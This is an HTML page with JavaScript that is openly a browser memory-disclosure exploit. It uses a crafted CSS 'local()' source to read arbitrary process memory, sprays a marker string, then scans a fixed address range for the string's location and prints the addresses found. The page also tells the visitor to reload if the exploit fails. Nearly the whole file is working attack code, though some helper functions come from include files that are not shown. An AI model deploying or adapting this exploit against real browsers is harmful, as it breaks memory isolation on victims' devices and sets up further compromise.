<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>

<script>


function readMemory(expl, address, size)
{
 expl.style.src = 'local(' + generateMemoryExploit(address, size) + ')';
 return expl.style.src;
}

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len)
{
	try
	{
		var exp = document.getElementById('ex' );
		var temp = readMemory(exp,search_base, search_size+6);
		// move past "local("
		var dat = temp.substr(6, search_size);
		//alert(temp);
		temp=null;
		
		
		// loop searching for tag
		for (var i=0;i<(search_size*2);i+=0x10)
		{
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				// loop next bytes for comparison
				for (var k = 0; k <(len*2); k+=0x2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 1;
				}
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					var cont = 0;
					if(offsets.length > 0)
					{
						for(var idx = 0;idx < offsets.length;idx+=1)
						{
							if(offsets[idx]==exploit_addr)
							{
								cont = 1;
								break;
							}
						}
						if(cont == 1)
						{
							dbg(exploit_addr.toString(16) + " is ignored.");
							cont=0;
							continue;
						}
					}
					//offsets[offsets.length] = exploit_addr;
					offsets.push(exploit_addr);
					dat=null;
					//exp=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		//exp=null;
		var end_range = search_base+search_size;
		dbg("The string variable named " + name + " could not be located in range " + search_base.toString(16) + " - " + end_range.toString(16));
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

var MutableString = function(value) {
  this.text = value;
};
 
MutableString.prototype = {
  toString: function() {
    return this.text;
  }
};

MutableString.prototype = {
  replaceAt: function(index, char) {
    this.text=this.text.substr(0, index) + char + this.text.substr(index+char.length);
    //return this.text;
  }
};
function init(){
var x = unescape("\u4141");

for(var ctx=0;ctx<0x2FF;ctx+=1)
{
//dbg("ctx: " + ctx + " / x: " + a2hex(x));
x += unescape("\u4141"); 
}

var exploit = new MutableString(x);
alert("exploit: " + exploit);
exploit.replaceAt(0,hexh2bin(0x2A2F));
var addr_1=findJsVariableOffset("exploit", exploit.text, 0x80180000, 0x8A0000, 0x2A2F, 0x300);
document.write("addr_1: 0x"+addr_1.toString(16));
exploit.replaceAt(1,hexh2bin(0x4141));
exploit.replaceAt(2,hexh2bin(0x4242));
exploit.replaceAt(3,hexh2bin(0x4343));
exploit.replaceAt(4,hexh2bin(0x4444));
var addr_2=findJsVariableOffset("exploit", exploit.text, 0x80180000, 0x8A0000, 0x2A2F, 0x300);
document.write("addr_2: 0x"+addr_2.toString(16));
} 
</script>
</head>
<body id="BodyID" onload="init();">
		If this message appears, reload page because exploit failed!<br>
		<div id="ex" />
		<br>
		<div id="log"></div>
	</body>
</html>
